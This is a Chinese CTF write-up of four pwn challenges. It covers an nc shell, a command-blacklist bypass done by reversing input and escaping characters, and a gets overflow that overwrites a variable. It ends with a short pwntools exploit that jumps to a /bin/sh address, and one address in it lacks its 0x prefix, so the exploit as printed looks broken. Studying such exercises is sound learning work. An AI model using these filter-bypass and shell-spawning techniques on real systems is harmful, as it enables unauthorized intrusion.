# PWN



## 1.nc一下就出来*

下载好附件后，检查文件保护及类型等相关信息，发现是64位，就用64位ida打开

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 123207.png" alt="屏幕截图 2024-10-16 123207" style="zoom: 67%;" />

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 124224.png" alt="屏幕截图 2024-10-16 124224" style="zoom:67%;" />

检查附件发现，连上之后就会获得交互权限，第一次命令会被消除掉，然后输出’不要做坏事‘后就可以输入指令进行交互，ls查看目录，cat flag获得flag

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 124654.png" alt="屏幕截图 2024-10-16 124654" style="zoom:67%;" />

## 2.再nc一下**

检查附件，用64位ida打开分析附件

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 124842.png" alt="屏幕截图 2024-10-16 124842" style="zoom: 67%;" />

发现reverse函数和blacklisted函数，点进去看一下

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125017.png" alt="屏幕截图 2024-10-16 125017" style="zoom: 67%;" />

reverse函数内，将输入的字符串进行了反转

![屏幕截图 2024-10-16 125035](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125035.png)

blacklist函数内，存在不能使用的命令 ls cd ‘ 空格’ cat echo ${IFS}

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125151.png" alt="屏幕截图 2024-10-16 125151" style="zoom:67%;" />

<img src="C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125214.png" alt="屏幕截图 2024-10-16 125214" style="zoom:67%;" />

所以我们需要反着输入命令，并且不能出现黑名单里的命令，可以通过添加无效字符，也就是说输入 l\s，执行时是 l\s=ls，但在字符串判断时肯定不是相同的。所以我们可以通过输 入时添加无效字符来绕过这个过滤 

![屏幕截图 2024-10-16 124929](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 124929.png)

## 3.Overflow**

![屏幕截图 2024-10-16 125351](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125351.png)

用64位ida打开

![屏幕截图 2024-10-16 125443](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 125443.png)

存在危险函数[gets](https://so.csdn.net/so/search?q=gets&spm=1001.2101.3001.7020)，填满数组v4后填充v5，当v5 ！=0时，自动弹出flag，所以要用变量覆写

exp如下

![屏幕截图 2024-10-16 130234](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 130234.png)

## 4.Search***

检查保护也是64位，用64位ida打开，分析附件

![屏幕截图 2024-10-16 131458](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 131458.png)

gets函数

![屏幕截图 2024-10-16 131516](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 131516.png)

![屏幕截图 2024-10-16 131353](C:\Users\22474\Desktop\kaohe-pwn\PWN.assets\屏幕截图 2024-10-16 131353-1729057184149-29.png)

我们可以挟持程序流到该/bin/s处执行，从而获取交互权限，先把v4填充满128个字节，再填充64位程序的8个字节，,再进行栈平衡，地址是0x40044e，在挟持程序流到/bin/sh处0x400586

exp如下：

from pwn import*

p=remote("环境")

payload=b'b'*136+p64(0x40044e)+p64(400586)

p.sendline(payload)

p.interactive()